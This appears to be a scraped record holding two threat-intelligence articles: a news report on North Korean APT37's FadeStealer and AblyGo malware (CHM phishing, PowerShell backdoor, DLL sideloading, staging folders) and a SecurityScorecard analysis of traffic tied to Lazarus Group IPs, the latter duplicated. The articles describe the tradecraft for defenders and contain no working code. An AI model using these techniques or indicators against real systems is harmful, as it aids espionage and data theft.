Trojan, Virus, Worm, or other MalwareHow to show hidden files in Windows 7How to see hidden files in WindowsVirus Removal GuidesLatestMost ViewedRansomwareRemove the Theonlinesearch.com Search RedirectRemove the Smartwebfinder.com Search RedirectHow to remove the PBlock+ adware browser extensionRemove the Toksearches.xyz Search RedirectRemove Security Tool and SecurityTool (Uninstall Guide)How to Remove WinFixer / Virtumonde / Msevents / Trojan.vundoHow to remove Antivirus 2009 (Uninstall Instructions)How to remove Google Redirects or the TDSS, TDL3, or Alureon rootkit using TDSSKillerLocky Ransomware Information, Help Guide, and FAQCryptoLocker Ransomware Information Guide and FAQCryptorBit and HowDecrypt Information Guide and FAQCryptoDefense and How_Decrypt Ransomware Information Guide and FAQDownloadsLatestMost DownloadedQualys BrowserCheckSTOPDecrypterAuroraDecrypterFilesLockerDecrypterAdwCleanerComboFixRKillJunkware Removal ToolDealsCategorieseLearningIT Certification CoursesGear + GadgetsSecurityVPNsPopularBest VPNsHow to change IP addressAccess the dark web safelyBest VPN for YouTubeForumsMoreStartup DatabaseUninstall DatabaseGlossaryChat on DiscordSend us a Tip!Welcome GuideHomeNewsSecurityAPT37 hackers deploy new FadeStealer eavesdropping malwareAPT37 hackers deploy new FadeStealer eavesdropping malwareByLawrence AbramsJune 21, 202304:16 PM0The North Korean APT37 hacking group uses a new 'FadeStealer' information-stealing malware containing a 'wiretapping' feature, allowing the threat actor to snoop and record from victims' microphones.APT37, also known as StarCruft, Reaper, or RedEyes, is believed to be a state-sponsored hacking group with a long history of conducting cyber espionage attacks aligned with North Korean interests. These attacks target North Korean defectors, educational institutions, and EU-based organizations.In the past, the hackers were known to utilize custom malware called 'Dolphin' and 'M2RAT' to execute commands and steal data, credentials, and screenshots from Windows devices and even connected mobile phones.It starts with a CHM fileIn anew reportfrom the AhnLab Security Emergency Response Center (ASEC), researchers provide information on new custom malware dubbed 'AblyGo backdoor' and 'FadeStealer' that the threat actors use in cyber espionage attacks.The StarCruft attack flowSource: ASECThe malware is believed to be delivered using phishing emails with attached archives containing password-protected Word and Hangul Word Processor documents (.docx and .hwp files) and a 'password.chm' Windows CHM file.ASEC believes that the phishing emails instruct the recipient to open the CHM file to obtain the password for the documents, which begins the infection process on the Windows device.Once the CHM file is opened, it will display the alleged password to open the document but also quietly downloads and executes a remote PowerShell script that contains backdoor functionality and is registered to autostart with Windows.This PowerShell backdoor communicates with the attackers' command and control servers and executes any commands sent by the attackers.The backdoor is used to deploy an additional GoLang backdoor used in the later stages of the attack to conduct privilege escalation, data theft, and the delivery of further malware.This new backdoor is named 'AblyGo backdoor,' as it uses theAbly Platform, an API service that allows developers to deploy real-time features and information delivery in their applications.The threat actors use ABLY as a command and control platform to send base64-encoded commands to the backdoor to execute and then to receive any output, where the threat actors later retrieve it.As this is a legitimate platform, it is likely used by the threat actors to evade network monitoring and security software.ASEC gained access to the Ably API key used by the backdoor and could monitor some of the commands issued by the attackers. These commands illustrated how the hackers used the backdoor to list the files in a directory, rename a fake .jpg file to an .exe file, and then execute it.However, it is technically possible for the threat actor to send any command they wish to execute.FadeStealer wiretaps your deviceUltimately, the backdoors deploy a final payload in the form of 'FadeStealer,' an information-stealing malware capable of stealing a wide variety of information from Windows devices.When installed, FadeStealer is injected using DLL sideloading into the legitimate Internet Explorer 'ieinstall.exe' process and begins stealing data from the device and storing them in RAR archives every 30 minutes.The data includes screenshots, logged keystrokes, files collected from connected smartphones, and removable devices. The malware also includes the ability to record audio from a connected microphone, enabling the threat actors to listen in on conversations.This data is collected in the following %Temp% folders:Folder PathExfiltrated Data%temp%\VSTelems_Fade\NgenPdbcScreenshots%temp%\VSTelems_Fade\NgenPdbkKeylogging%temp%\VSTelems_Fade\NgenPdbmMicrophone wiretapping%temp%\VSTelems_FadeInData collection of smartphone device%temp%\VSTelems_FadeOutRemovable media deviceThe threat actors can then analyze this collected data to steal sensitive information for use by the North Korean government or conduct further attacks.APT37 is not the only North Korean threat actor utilizing CHM files to deploy malware.ASEC alsoreported todaythat the Kimsuky state-sponsored hacking group is utilizing CHM files in phishing attacks to deploy malicious scripts that steal user information and install additional malware.""If you examine the overall attack flow in this case, the threat actor carried out their attack cleverly and precisely by employing spear phishing emails to gain access to target systems and using an Ably channel as a command-and-control server,"" concluded the researchers.""These sorts of attacks are difficult for individuals to notice.""Related Articles:Azure domains and Google abused to spread disinformation and malwareHackers posing as Ukraine’s Security Service infect 100 govt PCsNew LianSpy malware hides by blocking Android security featureNew CMoon USB worm targets Russians in data theft attacksRansomware gang targets IT workers with new SharpRhino malwareABLYAblyGo backdoorInformation-stealing malwareMalwareMicrophoneRedEyesStarCruftWiretapLawrence AbramsLawrence Abrams is the owner and Editor in Chief of BleepingComputer.com. Lawrence's area of expertise includes Windows, malware removal, and computer forensics. Lawrence Abrams is a co-author of the Winternals Defragmentation, Recovery, and Administration Field Guide and the technical editor for Rootkits for Dummies.Previous ArticleNext ArticlePost a CommentCommunity RulesYou need to login in order to post a commentNot a member yet?Register NowYou may also like:Popular StoriesNew Mad Liberator gang uses fake Windows update screen to hide data theftMicrosoft: Enable MFA or lose access to admin portals in OctoberFollow us:Main SectionsNewsVPN Buyer GuidesSysAdmin Software GuidesDownloadsVirus Removal GuidesTutorialsStartup DatabaseUninstall DatabaseGlossaryCommunityForumsForum RulesChatUseful ResourcesWelcome GuideSitemapCompanyAbout BleepingComputerContact UsSend us a Tip!AdvertisingWrite for BleepingComputerSocial & FeedsChangelogTerms of Use-Privacy Policy-Ethics Statement-Affiliate DisclosureCopyright @ 2003 - 2024Bleeping Computer®LLC- All Rights ReservedLoginUsernamePasswordRemember MeSign in anonymouslySign in with TwitterNot a member yet?Register NowReporterHelp us understand the problem. What is going on with this comment?SpamAbusive or HarmfulInappropriate contentStrong languageOtherRead ourposting guidelineseto learn what content is prohibited.Submitting...SUBMIT"
https://www.uscloud.com/blog/hackers-target-government-defense-contractors-with-new-backdoor-malware/,,,
https://securityscorecard.com/research/lazarus-group-suspicious-traffic-involving-state-government-ip-addresses/,"The Forrester Wave™: Cybersecurity Risk Ratings Platforms, Q2 2024 Instant visibility into an organization’s cyber hygiene with A-F ratings. share In early February, analystsattributeda new intrusion affecting a healthcare research organization to the Lazarus Group, a well-established threat actor believed to act on behalf of the government of the Democratic People’s Republic of Korea (DPRK). While investigating this intrusion, these analysts linked it to a wider campaign targeting organizations in other sectors, including manufacturing, higher education, and research. It may also be notable that the affected manufacturing firm produces technology used in other critical sectors such as energy, research, defense, and healthcare. Organizations in these fields could, therefore, also be targets of similar activity. The report provided ten IP addresses in its list of IoCs. To enrich the IoCs provided in the original report, STRIKE Team researchers consulted internal and external data sources for additional data regarding these IP addresses. Researchers first used SecurityScorecard’s exclusive access to network flow (NetFlow) data to collect a sample of traffic involving the IP addresses named as Lazarus Group IoCs in the report. To identify possible targets of the campaign, researchers searched for the IP addresses appearing in this sample in public sources of ownership data to determine the organizations that own the IP addresses with which the Lazarus Group-linked IP addresses communicated. In the case of IP addresses belonging to service providers other organizations may use, researchers queried SecurityScorecard’sAttack Surface Intelligencetool to identify the organizations to which SecurityScorecard has attributed the IP addresses, as those organizations are also possible targets of the activity. Throughout the two-month observation period, 28,185 unique IP addresses communicated with the ten IP addresses appearing in the alert. Most of these belonged to search engines, hosting providers, and telecommunications companies. Therefore, the traffic involving them was either likely irrelevant to the activity discussed in the report or unlikely to offer additional insights regarding it. Of the remaining IP addresses, researchers identified 691 that either belong to organizations in possible target sectors, including those named in the above-cited report, such as manufacturing and energy, or others the Lazarus Group has previously targeted, including financial services and government. However, particularly large numbers of these IP addresses belonged to organizations in the entertainment and media, and research and education sectors.  Image 1: Of the 691 IP addresses most likely to yield insights about threat actor behavior, particularly large numbers belonged to research and education or entertainment and media organizations. The original report identifies the two IP addresses from the IoC list responsible for the bulk of this traffic as possible VPN endpoints. This traffic may reflect the activity of other users in addition to the Lazarus Group, which could explain some of the trends in the traffic. For example, the communication with IP addresses belonging to organizations in the entertainment and media category (many of which are gaming companies or streaming services) could reflect attempts to access those services from jurisdictions where they would normally be inaccessible. Similarly, although the February report noted that the recent Lazarus Group campaign targeted the higher education sector, the traffic to research and educational institutions may not reflect that activity. A great deal of web traffic still passes through educational and research institutions’ networks because these institutions furnished much of the internet’s early infrastructure and, as an inheritance of this early role, still route a great deal of traffic. That being the case, traffic to their networks does not necessarily indicate targeting. Additionally, a strategic partner has identified many of the IP addresses belonging to some of the most heavily-represented universities in the dataset as scanners, which suggests that their communication with the IP addresses from the IoC list may represent automated activity initiated by the university IP addresses rather than targeting of those universities by the Lazarus Group. In most cases, the traffic involving these IP addresses was less likely to merit further attention. It featured relatively brief periods of communication and small data transfers, often just a single flow of less than a kilobyte. However, some brief exchanges may yield additional insights into threat actor behavior. For example, traffic to the IP addresses categorized as belonging to privacy services (most of which belong to the same encrypted email and VPN service) may represent threat actors’ attempts to use those services. Brief connections to such services may reflect their use, given that once a user has connected to it, their traffic would appear to be coming from an IP address the VPN uses rather than the user’s original IP address. Additionally, three IP addresses belonging to remote access software companies appear in the dataset; threat actors have sometimes abused these services, which this communication may reflect. This traffic may help identify other tools the threat actors have used. However, in the case of one state government IP address, the communication was somewhat more sustained and, therefore, more likely to be of concern. One Lazarus Group-linked IP address (23.237.32[.]34) and another IP address exchanged data 1,158 times on February 13. The available IP WHOIS data identifies a state government as the registrant organization of the IP address in question. SecurityScorecard’s Attack Surface Intelligence tool identifies a state government subdomain as its hostname.  Image 2: Attack Surface Intelligence connects the IP address with which a Lazarus Group-linked one communicated to a state government subdomain. The specific subdomain identified by Attack Surface Intelligence corresponds to the state oil and gas board’s Web Applications, which offer access to data regarding oil and gas extraction.  Image 3: The state government IP address in question appears to host data regarding the energy industry. Given that the earlier report noted that the recent Lazarus Group campaign targeted a manufacturing firm that serves the energy industry, it is possible that other organizations serving that industry or collecting data about it would also be of interest to the group. (This interest is hardly unique to the Lazarus Group; many other APT groups have also targeted the energy sector and firms surrounding it in previous campaigns). Further review of the traffic samples revealed that another of the IP addresses linked to the Lazarus Group and a different IP address registered to the same state government communicated earlier. On January 13, at least two flows between it and 146.185.26[.]150 (a Lazarus-linked IP address) took place. The sample involving these IP addresses appears to reflect a smaller data exchange, as it only features two flows with relatively minimal byte counts. However, in light of the subsequent and considerably more numerous flows between an IP address linked to the Lazarus Group in the February report and another belonging to the state government, it could reflect an earlier stage of an attempt to access state resources. While this data may reflect Lazarus Group activity, alternative explanations also merit consideration. The report that first linked the two IP addresses to Lazarus Group activity noted that they might be VPN endpoints, so a different VPN user may be responsible for the traffic to the state government IP addresses. Moreover, both IP addresses belong to hosting providers, so another of their customers may be responsible for the traffic. Finally, members of the VirusTotal community have linked the IP addresses to non-Lazarus threat activity: they appear inone collectionfor tracking generically suspicious activity andanotherfor tracking the activity of theBlack Basta ransomware group.   Images 4-5: The IP addresses also appear in VirusTotal collections regarding activity for which the Lazarus Group is not necessarily responsible but which is nonetheless malicious or suspicious. Regarding the possibility that the previous Lazarus Group activity indicated an interest in the energy sector and the inclusion of the IP address in question in a report about Lazarus Group activity, SecurityScorecard assesses with low confidence that the traffic between that IP address and one hosting state oil and gas board data reflects Lazarus Group targeting of state government assets. However, it remains possible that other parties have also used the same IP addresses as Lazarus Group. Even if that is the case, the traffic is nonetheless suspicious, as the IP addresses involved also appear on lists tracking other threat activity in addition to that attributed to the Lazarus Group. © 2024 SecurityScorecardTerms Of UsePrivacy PolicyCookie PreferencesPatents ",Platform column Products Supply Chain Cyber Risk Third-Party Cyber Risk Management Automatic Vendor Detection Supply Chain Risk Intelligence Security Questionnaires Security & Risk Operations External Attack Surface Management Cyber Risk Quantification Threat Landscape Attack Surface Intelligence Intelligence Feeds Vulnerability Intelligence Cyber Insurance For Insureds Insurance Brokers Underwriters & Portfolio Managers column Pricing & Packages MAX Enterprise Business Free All pricing & packages NEWIntroducing MAX SECURITY RATINGS Why SecurityScorecard? column Capabilities Security Ratings HEID AI Security Data Trust & Collaboration Marketplace Board & Executive Reporting column Customers Customer Stories Awards Reviews Odyssey.Conf Academy column Industries We Help Cyber Insurance Public Sector Technology Retail & Consumer Critical Infrastructure Automotive Energy Legal Telecom Hospitality & Gaming Healthcare Financial Services Services column Digital Forensics & Incident Response Advisory Services Penetration Testing Red Team Tabletop Exercises NEWManaged Services Partners column Locate a Partner Value-Added Resellers Managed Service Providers ISAC Partner Program Technology Alliances SCORE Portal Login Marketplace Resources column Collateral Webinars Case Studies Whitepapers Analyst Reports Learning Center Product Information column Insights Blog Research Media Channels column Tools CVEDetails Public Scorecards Chrome Extension Developer Hub Help Center Company column Leadership Press Events Policy Insights Careers Alumni Network Contact Us Resources Resources Investigations of Lazarus Group Indicators of Compromise Reveals Suspicious Traffic Involving State Government IP Addresses Investigations of Lazarus Group Indicators of Compromise Reveals Suspicious Traffic Involving State Government IP Addresses Research,"Investigations of Lazarus Group Indicators of Compromise Reveals Suspicious Traffic Involving State Government IP Addresses - SecurityScorecardThe Forrester Wave™: Cybersecurity Risk Ratings Platforms, Q2 2024Get the ReportSupportLoginContactEnglishJapaneseEnter search termPlatformcolumnProductsSupply Chain Cyber RiskThird-Party Cyber Risk ManagementAutomatic Vendor DetectionSupply Chain Risk IntelligenceSecurity QuestionnairesSecurity & Risk OperationsExternal Attack Surface ManagementCyber Risk QuantificationThreat LandscapeAttack Surface IntelligenceIntelligence FeedsVulnerability IntelligenceCyber InsuranceFor InsuredsInsurance BrokersUnderwriters & Portfolio ManagerscolumnPricing & PackagesMAXEnterpriseBusinessFreeAll pricing & packagesNEWIntroducing MAXSECURITY RATINGSInstant visibility into an organization’s cyber hygiene with A-F ratings.Why SecurityScorecard?columnCapabilitiesSecurity RatingsHEID AISecurity DataTrust & CollaborationMarketplaceBoard & Executive ReportingcolumnCustomersCustomer StoriesAwardsReviewsOdyssey.ConfAcademycolumnIndustries We HelpCyber InsurancePublic SectorTechnologyRetail & ConsumerCritical InfrastructureAutomotiveEnergyLegalTelecomHospitality & GamingHealthcareFinancial ServicesServicescolumnDigital Forensics & Incident ResponseAdvisory ServicesPenetration TestingRed TeamTabletop ExercisesNEWManaged ServicesPartnerscolumnLocate a PartnerValue-Added ResellersManaged Service ProvidersISAC Partner ProgramTechnology AlliancesSCORE Portal LoginMarketplaceResourcescolumnCollateralWebinarsCase StudiesWhitepapersAnalyst ReportsLearning CenterProduct InformationcolumnInsightsBlogResearchMedia ChannelscolumnToolsCVEDetailsPublic ScorecardsChrome ExtensionDeveloper HubHelp CenterCompanycolumnLeadershipPressEventsPolicy InsightsCareersAlumni NetworkContact UsFree TrialGet a DemoSupportLoginContactFree TrialGet a DemoCloseResourcesInvestigations of Lazarus Group Indicators of Compromise Reveals Suspicious Traffic Involving State Government IP AddressesResearchInvestigations of Lazarus Group Indicators of Compromise Reveals Suspicious Traffic Involving State Government IP AddressesshareExecutive SummaryIn early February, analystsattributeda new intrusion affecting a healthcare research organization to the Lazarus Group, a well-established threat actor believed to act on behalf of the government of the Democratic People’s Republic of Korea (DPRK).In an effort to enrich the Indicators of Compromise (IoCs) provided in the original report, theSecurityScorecard Threat Research, Intelligence, Knowledge, and Engagement (STRIKE) Teamconsulted internal and external data sources for additional data regarding the IP addresses listed in it.During their investigation, STRIKE Team researchers observed traffic that may indicate targeting of a state government’s oil and gas board.While this traffic may not represent Lazarus Group activity, it likely merits further attention as it may still represent an attempt to access government systems by other threat actors.Other traffic may offer some insights into the behavior associated with the IP addresses in question, if not with a specific threat actor group.BackgroundIn early February, analystsattributeda new intrusion affecting a healthcare research organization to the Lazarus Group, a well-established threat actor believed to act on behalf of the government of the Democratic People’s Republic of Korea (DPRK). While investigating this intrusion, these analysts linked it to a wider campaign targeting organizations in other sectors, including manufacturing, higher education, and research. It may also be notable that the affected manufacturing firm produces technology used in other critical sectors such as energy, research, defense, and healthcare. Organizations in these fields could, therefore, also be targets of similar activity.The report provided ten IP addresses in its list of IoCs. To enrich the IoCs provided in the original report, STRIKE Team researchers consulted internal and external data sources for additional data regarding these IP addresses.MethodologyResearchers first used SecurityScorecard’s exclusive access to network flow (NetFlow) data to collect a sample of traffic involving the IP addresses named as Lazarus Group IoCs in the report. To identify possible targets of the campaign, researchers searched for the IP addresses appearing in this sample in public sources of ownership data to determine the organizations that own the IP addresses with which the Lazarus Group-linked IP addresses communicated.In the case of IP addresses belonging to service providers other organizations may use, researchers queried SecurityScorecard’sAttack Surface Intelligencetool to identify the organizations to which SecurityScorecard has attributed the IP addresses, as those organizations are also possible targets of the activity.FindingsThroughout the two-month observation period, 28,185 unique IP addresses communicated with the ten IP addresses appearing in the alert. Most of these belonged to search engines, hosting providers, and telecommunications companies. Therefore, the traffic involving them was either likely irrelevant to the activity discussed in the report or unlikely to offer additional insights regarding it.Of the remaining IP addresses, researchers identified 691 that either belong to organizations in possible target sectors, including those named in the above-cited report, such as manufacturing and energy, or others the Lazarus Group has previously targeted, including financial services and government. However, particularly large numbers of these IP addresses belonged to organizations in the entertainment and media, and research and education sectors.Image 1: Of the 691 IP addresses most likely to yield insights about threat actor behavior, particularly large numbers belonged to research and education or entertainment and media organizations.The original report identifies the two IP addresses from the IoC list responsible for the bulk of this traffic as possible VPN endpoints. This traffic may reflect the activity of other users in addition to the Lazarus Group, which could explain some of the trends in the traffic. For example, the communication with IP addresses belonging to organizations in the entertainment and media category (many of which are gaming companies or streaming services) could reflect attempts to access those services from jurisdictions where they would normally be inaccessible.Similarly, although the February report noted that the recent Lazarus Group campaign targeted the higher education sector, the traffic to research and educational institutions may not reflect that activity. A great deal of web traffic still passes through educational and research institutions’ networks because these institutions furnished much of the internet’s early infrastructure and, as an inheritance of this early role, still route a great deal of traffic. That being the case, traffic to their networks does not necessarily indicate targeting.Additionally, a strategic partner has identified many of the IP addresses belonging to some of the most heavily-represented universities in the dataset as scanners, which suggests that their communication with the IP addresses from the IoC list may represent automated activity initiated by the university IP addresses rather than targeting of those universities by the Lazarus Group.In most cases, the traffic involving these IP addresses was less likely to merit further attention. It featured relatively brief periods of communication and small data transfers, often just a single flow of less than a kilobyte.However, some brief exchanges may yield additional insights into threat actor behavior. For example, traffic to the IP addresses categorized as belonging to privacy services (most of which belong to the same encrypted email and VPN service) may represent threat actors’ attempts to use those services. Brief connections to such services may reflect their use, given that once a user has connected to it, their traffic would appear to be coming from an IP address the VPN uses rather than the user’s original IP address.Additionally, three IP addresses belonging to remote access software companies appear in the dataset; threat actors have sometimes abused these services, which this communication may reflect. This traffic may help identify other tools the threat actors have used.However, in the case of one state government IP address, the communication was somewhat more sustained and, therefore, more likely to be of concern. One Lazarus Group-linked IP address (23.237.32[.]34) and another IP address exchanged data 1,158 times on February 13. The available IP WHOIS data identifies a state government as the registrant organization of the IP address in question. SecurityScorecard’s Attack Surface Intelligence tool identifies a state government subdomain as its hostname.Image 2: Attack Surface Intelligence connects the IP address with which a Lazarus Group-linked one communicated to a state government subdomain.The specific subdomain identified by Attack Surface Intelligence corresponds to the state oil and gas board’s Web Applications, which offer access to data regarding oil and gas extraction.Image 3: The state government IP address in question appears to host data regarding the energy industry.Given that the earlier report noted that the recent Lazarus Group campaign targeted a manufacturing firm that serves the energy industry, it is possible that other organizations serving that industry or collecting data about it would also be of interest to the group. (This interest is hardly unique to the Lazarus Group; many other APT groups have also targeted the energy sector and firms surrounding it in previous campaigns).Further review of the traffic samples revealed that another of the IP addresses linked to the Lazarus Group and a different IP address registered to the same state government communicated earlier. On January 13, at least two flows between it and 146.185.26[.]150 (a Lazarus-linked IP address) took place. The sample involving these IP addresses appears to reflect a smaller data exchange, as it only features two flows with relatively minimal byte counts. However, in light of the subsequent and considerably more numerous flows between an IP address linked to the Lazarus Group in the February report and another belonging to the state government, it could reflect an earlier stage of an attempt to access state resources.While this data may reflect Lazarus Group activity, alternative explanations also merit consideration. The report that first linked the two IP addresses to Lazarus Group activity noted that they might be VPN endpoints, so a different VPN user may be responsible for the traffic to the state government IP addresses.Moreover, both IP addresses belong to hosting providers, so another of their customers may be responsible for the traffic. Finally, members of the VirusTotal community have linked the IP addresses to non-Lazarus threat activity: they appear inone collectionfor tracking generically suspicious activity andanotherfor tracking the activity of theBlack Basta ransomware group.Images 4-5: The IP addresses also appear in VirusTotal collections regarding activity for which the Lazarus Group is not necessarily responsible but which is nonetheless malicious or suspicious.ConclusionRegarding the possibility that the previous Lazarus Group activity indicated an interest in the energy sector and the inclusion of the IP address in question in a report about Lazarus Group activity, SecurityScorecard assesses with low confidence that the traffic between that IP address and one hosting state oil and gas board data reflects Lazarus Group targeting of state government assets.However, it remains possible that other parties have also used the same IP addresses as Lazarus Group. Even if that is the case, the traffic is nonetheless suspicious, as the IP addresses involved also appear on lists tracking other threat activity in addition to that attributed to the Lazarus Group.PlatformSupply Chain Cyber RiskThreat LandscapeSecurity & Risk OperationsCyber InsuranceMAXPricing & PackagesWhy SecurityScorecard?Security RatingsCustomer StoriesTrust & CollaborationMarketplaceServicesDigital Forensics & Incident ResponseAdvisory ServicesPenetration TestingRed TeamTabletop ExercisesPartnersLocate a PartnerValue-Added ResellersManaged Service ProvidersISAC Partner ProgramTechnology AlliancesSCORE Portal LoginResourcesBlogResearchLearning CenterWebinarsTools & DocumentationPublic ScorecardsCompanyLeadershipPressEventsPolicy InsightsCareersContact UsPatentslinkedininstagramtwitterfacebookyoutubebrighttalk© 2024 SecurityScorecardTerms Of UsePrivacy PolicyCookie PreferencesPatents"
